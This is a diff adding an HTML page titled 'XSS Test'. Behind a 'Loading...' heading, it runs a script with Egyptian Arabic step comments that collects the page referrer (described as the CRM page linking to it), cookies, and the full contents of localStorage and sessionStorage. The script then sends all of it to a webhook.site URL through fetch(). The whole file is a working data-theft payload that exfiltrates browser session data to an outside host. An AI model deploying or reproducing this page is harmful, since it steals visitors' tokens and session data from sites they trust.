@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // 1- نجيب الـ Referrer (ده هو رابط صفحة CRM اللي فيها الرابط)
+        let referrer = document.referrer;
+        
+        // 2- نجرب نجيب الكوكيز (هتفضل فارغة عشان domains مختلفة)
+        let cookies = document.cookie;
+        
+        // 3- نجيب localStorage كله
+        let local = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            local[key] = localStorage.getItem(key);
+        }
+        
+        // 4- نجيب sessionStorage كله
+        let session = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            let key = sessionStorage.key(i);
+            session[key] = sessionStorage.getItem(key);
+        }
+        
+        // 5- نبعت كل حاجة على Webhook بتاعك
+        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?ref=' + encodeURIComponent(referrer) + '&cookie=' + encodeURIComponent(cookies) + '&local=' + encodeURIComponent(JSON.stringify(local)) + '&session=' + encodeURIComponent(JSON.stringify(session)));
+    </script>
+</body>
+</html>
